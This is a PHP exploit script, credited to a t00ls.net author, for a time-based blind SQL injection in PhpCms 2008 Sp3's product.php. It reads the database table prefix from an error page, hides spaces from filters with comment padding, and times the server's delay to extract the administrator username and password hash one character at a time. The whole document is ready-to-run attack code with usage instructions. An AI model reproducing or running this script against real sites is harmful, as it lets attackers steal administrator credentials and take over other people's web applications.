<?php
ini_set("max_execution_time",0);
error_reporting(7);
 
function usage()
{
global $argv;
exit(
"\n--+++============================================================+++--".
"\n--+++====== PhpCms 2008 Sp3 Blind SQL Injection Exploit========+++--".
"\n--+++============================================================+++--".
"\n\n[+] Author: My5t3ry".
"\n[+] Team: [url]http://www.t00ls.net[/url]".
"\n[+] Usage: php ".$argv[0]." <hostname> <path>".
"\n[+] Ex.: php ".$argv[0]." localhost /yp".
"\n\n");
}
 
function query($pos, $chr, $chs)
{
global $prefix;
switch ($chs){
case 1:
$query = "1=1 and if((ascii(substring((select username from ".$prefix."member where groupid=1 limit 0,1),{$pos},1))={$chr}),benchmark(10000000,md5(1)),1)#";
break;
case 2:
$query = "1=1 and if((ascii(substring((select password from ".$prefix."member where groupid=1 limit 0,1),{$pos},1))={$chr}),benchmark(10000000,md5(1)),1)#";
break;
case 3:
$query = "1=1 and if((length((select username from ".$prefix."member where groupid=1 limit 0,1))={$pos}),benchmark(10000000,md5(1)),1)#";
break;
}
$query = str_replace(" ", "/**/", $query);
$query = urlencode($query);
return $query;
}
 
function exploit($hostname, $path, $pos, $chr, $chs)
{
$chr = ord($chr);
$conn = fsockopen($hostname, 80);
 
$postdata = "q=&action=searchlist&where=".query($pos, $chr, $chs);
$message = "POST ".$path."/product.php HTTP/1.1\r\n";
$message .= "Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n";
$message .= "Accept-Language: zh-cn\r\n";
$message .= "Content-Type: application/x-www-form-urlencoded\r\n";
$message .= "Accept-Encoding: gzip, deflate\r\n";
$message .= "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\r\n";
$message .= "Host: $hostname\r\n";
$message .= "Content-Length: ".strlen($postdata)."\r\n";
$message .= "Connection: Close\r\n\r\n";
$message .= $postdata;
//echo $message;
 
$time_a = time();
 
fputs($conn, $message);
while (!feof($conn))
$reply .= fgets($conn, 1024);
 
$time_b = time();
 
fclose($conn);
//echo $time_b - $time_a."\r\n";
 
if ($time_b - $time_a > 4)
return true;
else
return false;
}
 
function crkusername($hostname, $path, $chs)
{
global $length;
$key = "abcdefghijklmnopqrstuvwxyz0123456789";
$chr = 0;
$pos = 1;
echo "[+] username: ";
while ($pos <= $length)
{
if (exploit($hostname, $path, $pos, $key[$chr], $chs))
{
echo $key[$chr];
$chr = 0;
$pos++;
}
else
$chr++;
}
echo "\n";
}
 
function crkpassword($hostname, $path, $chs)
{
$key = "abcdef0123456789";
$chr = 0;
$pos = 1;
echo "[+] password: ";
while ($pos <= 32)
{
if (exploit($hostname, $path, $pos, $key[$chr], $chs))
{
echo $key[$chr];
$chr = 0;
$pos++;
}
else
$chr++;
}
echo "\n\n";
}
 
function lengthcolumns($hostname, $path, $chs)
{
echo "[+] username length: ";
$exit = 0;
$length = 0;
$pos = 0;
$chr = 0;
while ($exit==0)
{
if (exploit($hostname, $path, $pos, $chr, $chs))
{
$exit = 1;
$length = $pos;
}
else
$pos++;
}
echo $length."\n";
return $length;
}
 
function getprefix($hostname, $path)
{
echo "[+] prefix: ";
$conn = fsockopen($hostname, 80);
$request = "GET {$path}/product.php?q=&action=searchlist&where=%23 HTTP/1.1\r\n";
$request .= "Host: {$hostname}\r\n";
$request .= "Connection: Close\r\n\r\n";
fputs($conn, $request);
while (!feof($conn))
$reply .= fgets($conn, 1024);
 
fclose($conn);
preg_match('/FROM `(.+)yp_product/ie',$reply,$match);
 
if ($match[1])
return $match[1];
else
return false;
}
 
 
if ($argc != 3)
usage();
$prefix="";
$hostname = $argv[1];
$path = $argv[2];
$prefix = getprefix($hostname, $path);
if ($prefix)
{
echo $prefix."\r\n";
$length = lengthcolumns($hostname, $path, 3);
 
crkusername($hostname, $path, 1);
crkpassword($hostname, $path, 2);
}
else
{
exit("Exploit failed");
}
 
?>